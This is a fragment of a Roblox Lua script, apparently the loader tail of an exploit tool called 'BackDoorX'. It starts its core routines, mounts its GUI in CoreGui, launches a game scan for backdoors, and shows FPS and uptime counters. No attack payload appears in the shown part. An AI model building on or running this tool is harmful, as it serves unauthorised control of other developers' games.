coroutine.wrap(Core18)(backdoor_x.Core18);
coroutine.wrap(Core7) (backdoor_x.Core15);
coroutine.wrap(Core14)(backdoor_x.Core14);
coroutine.wrap(Core19)(backdoor_x.Core19);
coroutine.wrap(Core21)(backdoor_x.Core21);
coroutine.wrap(Core24)(backdoor_x.Core24);
coroutine.wrap(Core20)(backdoor_x.Core20);
coroutine.wrap(Core23)(backdoor_x.Core23);
coroutine.wrap(Core22)(backdoor_x.Core22);
coroutine.wrap(Core7) (backdoor_x.Core25);
coroutine.wrap(Core7) (backdoor_x.Core13);
coroutine.wrap(Core7) (backdoor_x.Core11);
coroutine.wrap(Core4)  (backdoor_x.Core4);
coroutine.wrap(Core5)  (backdoor_x.Core5);
coroutine.wrap(Core2)  (backdoor_x.Core2);
coroutine.wrap(Core12)(backdoor_x.Core12);
coroutine.wrap(Core6)  (backdoor_x.Core6);
coroutine.wrap(Core8)  (backdoor_x.Core8);
coroutine.wrap(Core7)  (backdoor_x.Core7);
coroutine.wrap(Core10)(backdoor_x.Core10);
coroutine.wrap(Core7)  (backdoor_x.Core9);
local getgui = function()if debuging then return game.Players.LocalPlayer.PlayerGui;else return game.CoreGui;end;end;
backdoor_x.BackDoorX.Parent = getgui();
backdoor_x.BackDoorX.Enabled=true;
backdoor_x.BackDoorX.ResetOnSpawn=false;
local function round(num:number):number return math.floor(num * 10^3 + 0.5) / 10^3;end;
print("end\nLoaded in: " .. round(tick()-start) .. " ms.");
wait(2);
task.spawn(scanGame);
local FPSCounter = backdoor_x.fps;
local TimeCounter = backdoor_x.uptime;
RunService.RenderStepped:Connect(function(TimeBetween)local FPS=math.floor(1 / TimeBetween);FPSCounter.Text=tostring(FPS);end);
while true do local time = tonumber(math.floor(game:GetService('Workspace').DistributedGameTime));TimeCounter.Text = time..'s';wait(0.1);end;
